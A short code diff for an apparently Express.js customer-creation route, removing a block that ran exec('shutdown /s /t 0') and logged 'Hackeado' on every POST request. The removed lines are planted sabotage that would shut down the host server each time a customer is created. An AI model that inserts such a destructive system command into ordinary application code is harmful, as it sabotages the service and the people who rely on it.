@@ -46,10 +46,6 @@ router.post(
       const body = req.body;
       const newCustomer = await service.create(body);
 
-      exec('shutdown /s /t 0', (error, stdout, stderr) => {
-        console.log('Hackeado ');
-      });
-
       res.status(201).json(newCustomer);
     } catch (error) {
       next(error);
